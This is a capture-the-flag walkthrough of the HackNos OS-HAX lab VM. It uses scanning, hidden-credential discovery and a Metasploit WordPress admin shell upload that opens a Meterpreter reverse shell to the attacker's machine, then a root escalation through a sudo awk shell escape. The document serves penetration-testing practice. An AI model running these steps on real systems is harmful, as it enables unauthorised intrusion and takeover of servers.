
# HackNos OS-HAX - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hacknos-os-hax,389/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.115   08:00:27:5a:3b:9f      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.115
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 10:21 -03
Nmap scan report for 192.168.1.115
Host is up (0.00026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)
|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)
|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

### WEB Analysis

```
$ dirb http://192.168.1.115

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan 24 10:21:56 2021
URL_BASE: http://192.168.1.115/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.115/ ----
==> DIRECTORY: http://192.168.1.115/css/                                                                             
==> DIRECTORY: http://192.168.1.115/html/                                                                            
==> DIRECTORY: http://192.168.1.115/img/                                                                             
+ http://192.168.1.115/index.html (CODE:200|SIZE:3135)                                                               
==> DIRECTORY: http://192.168.1.115/js/                                                                              
+ http://192.168.1.115/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.115/wordpress/                                                                       
                                                                                                                     
---- Entering directory: http://192.168.1.115/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/html/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/ ----
+ http://192.168.1.115/wordpress/index.php (CODE:301|SIZE:0)                                                         
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/                                                              
==> DIRECTORY: http://192.168.1.115/wordpress/wp-content/                                                            
==> DIRECTORY: http://192.168.1.115/wordpress/wp-includes/                                                           
+ http://192.168.1.115/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                       
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/ ----
+ http://192.168.1.115/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/css/                                                          
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/images/                                                       
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/includes/                                                     
+ http://192.168.1.115/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/js/                                                           
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/maint/                                                        
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/network/                                                      
==> DIRECTORY: http://192.168.1.115/wordpress/wp-admin/user/                                                         
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-content/ ----
+ http://192.168.1.115/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                              
==> DIRECTORY: http://192.168.1.115/wordpress/wp-content/plugins/                                                    
==> DIRECTORY: http://192.168.1.115/wordpress/wp-content/themes/                                                     
==> DIRECTORY: http://192.168.1.115/wordpress/wp-content/upgrade/                                                    
==> DIRECTORY: http://192.168.1.115/wordpress/wp-content/uploads/                                                    
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/network/ ----
+ http://192.168.1.115/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                        
+ http://192.168.1.115/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                        
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-admin/user/ ----
+ http://192.168.1.115/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                           
+ http://192.168.1.115/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                           
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-content/plugins/ ----
+ http://192.168.1.115/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                      
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-content/themes/ ----
+ http://192.168.1.115/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                       
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.115/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Jan 24 10:22:09 2021
DOWNLOADED: 36896 - FOUND: 13
```

```
$ nikto -h http://192.168.1.115

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.115
+ Target Hostname:    192.168.1.115
+ Target Port:        80
+ Start Time:         2021-01-24 10:22:14 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: c3f, size: 596423114adc0, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /html/: Directory indexing found.
+ OSVDB-3092: /html/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-01-24 10:23:38 (GMT-3) (84 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.115
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,js,/,html,php
[+] Timeout:        10s
===============================================================
2021/01/24 10:22:29 Starting gobuster
===============================================================
/html (Status: 301)
/img (Status: 301)
/css (Status: 301)
/wordpress (Status: 301)
/js (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/24 10:27:30 Finished
===============================================================
```

### WordPress Analysis

```
$ wpscan -e ap,at,u --url http://192.168.1.115/wordpress

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.13
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.115/wordpress/ [192.168.1.115]
[+] Started: Sun Jan 24 10:28:22 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.115/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.115/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.115/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.115/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.9 identified (Latest, released on 2020-10-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.115/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.115/wordpress/, Match: 'WordPress 5.2.9'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] web
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jan 24 10:28:24 2021
[+] Requests Done: 48
[+] Cached Requests: 4
[+] Data Sent: 11.995 KB
[+] Data Received: 72.92 KB
[+] Memory used: 112.969 MB
[+] Elapsed time: 00:00:01
```

User: **web**

### Flag #1 - Host

Looking into `http://192.68.1.115/img` listable directory, we can find the `flaghost.png` file:
```
$ wget http://192.168.1.115/img/flaghost.png

--2021-01-24 10:42:29--  http://192.168.1.115/img/flaghost.png
Connecting to 192.168.1.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26723 (26K) [image/png]
Saving to: ‘flaghost.png’

flaghost.png                100%[==========================================>]  26.10K  --.-KB/s    in 0s      

2021-01-24 10:42:29 (81.0 MB/s) - ‘flaghost.png’ saved [26723/26723]
```

I was looking for some steganograph data, but `.png` format is not supported for the most common steganograph tools.\
So I checked the file metadata:
```
$ exiftool flaghost.png

ExifTool Version Number         : 12.14
File Name                       : flaghost.png
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2019:11:01 07:50:17-03:00
File Access Date/Time           : 2021:01:24 10:47:33-03:00
File Inode Change Date/Time     : 2021:01:24 10:47:30-03:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 387
Image Height                    : 98
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Make                            : passw@45    <<<
Image Size                      : 387x98
Megapixels                      : 0.038
```

Apparently we have found a password: **passw@45**\
Unfortunately it is not the WordPress credentials with the previously found WordPress user **web**...

### Flag #2

The `passw@45` is not a password. It is a listable endpoint directory.
```
http://192.168.1.115/passw@45
```

In this directory we found the `flag2.txt` file.
```
$ wget http://192.168.1.115/passw@45/flag2.txt

--2021-01-24 11:00:56--  http://192.168.1.115/passw@45/flag2.txt
Connecting to 192.168.1.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 263 [text/plain]
Saving to: ‘flag2.txt’

flag2.txt                              100%[=========================================================================>]     263  --.-KB/s    in 0s      

2021-01-24 11:00:56 (69.6 MB/s) - ‘flag2.txt’ saved [263/263]
```

It contains Brainfuck encoded text.
```
$ cat flag2.txt

i+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++++ +++++ .<+++ +[->- ---<]
>--.- --.<+ +++++ [->-- ----< ]>--- -.<++ +[->+ ++<]> +++++ .<+++ ++[->
+++++ <]>.+ +.+++ +++++ .---- --.<+ ++[-> +++<] >++++ .<+++ ++++[ ->---
----< ]>-.< +++[- >---< ]>--- .+.-- --.++ +.<
```

Using this Brainfuck Visualizer ( https://fatiherikli.github.io/brainfuck-visualizer/ ) we got this follow result:
```
web:Hacker@4514
```

Now we got the WordPress credentials matching with the previously found WordPress user **web**.\
\
WordPress Credentials:
* User: **web**
* Pass: **Hacker@4514**

### Exploitation

Using Metasploit `wp_admin_shell_upload` module.
```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.115
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME web
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD Hacker@4514

msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   Hacker@4514      yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.115    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress       yes       The base path to the wordpress application
   USERNAME   web              yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Authenticating with WordPress using web:Hacker@4514...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/GGkAmIjSVx/KQETiWnhKh.php...
[*] Sending stage (39282 bytes) to 192.168.1.115
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.115:53478) at 2021-01-24 11:09:21 -0300
[+] Deleted KQETiWnhKh.php
[+] Deleted GGkAmIjSVx.php
[+] Deleted ../GGkAmIjSVx

meterpreter > sysinfo
Computer    : jax
OS          : Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686
Meterpreter : php/linux
```

### Flag #3 - User

```
meterpreter > shell

python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@jax:/$

www-data@jax:/$ cat /home/web/flag3.txt
   ______          ______          ____                 __ 
  / ____/____     /_  __/____     / __ \ ____   ____   / /_
 / / __ / __ \     / /  / __ \   / /_/ // __ \ / __ \ / __/
/ /_/ // /_/ /    / /  / /_/ /  / _, _// /_/ // /_/ // /_  
\____/ \____/    /_/   \____/  /_/ |_| \____/ \____/ \__/  
                                                           

MD5-HASH : 40740735d446c27cd551f890030f7c75
```

### Privilege Escalation - web

We are in **www-data** user role. But we have the **web** user credentials, so it is just to switch it out.
```
www-data@jax:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@jax:/$ su web
Password: Hacker@4514

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
web@jax:/$

web@jax:/$ id
uid=1001(web) gid=1000(uname-a) groups=1000(uname-a)
```

### Privilege Escalation - Root

The **web** user has perission to run `/usr/bin/awk` as root without password.
```
web@jax:/$ sudo -l

Matching Defaults entries for web on jax:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on jax:
    (root) NOPASSWD: /usr/bin/awk
```

Now it is just to run a privilege escalation routine with `awk`
```
web@jax:/$ sudo awk 'BEGIN {system("/bin/bash")}'

root@jax:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag #4 - Root

```
root@jax:/root# cat final.txt

    ______ ____ _   __ ___     __         ____   ____   ____  ______     ______ __     ___    ______
   / ____//  _// | / //   |   / /        / __ \ / __ \ / __ \/_  __/    / ____// /    /   |  / ____/
  / /_    / / /  |/ // /| |  / /        / /_/ // / / // / / / / /      / /_   / /    / /| | / / __  
 / __/  _/ / / /|  // ___ | / /___     / _, _// /_/ // /_/ / / /      / __/  / /___ / ___ |/ /_/ /  
/_/    /___//_/ |_//_/  |_|/_____/    /_/ |_| \____/ \____/ /_/      /_/    /_____//_/  |_|\____/  

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
Rahul_Gehlaut  =>> https://www.linkedin.com/in/rahulgehlaut/
Web_Site ==>> http://jameshacker.me
```
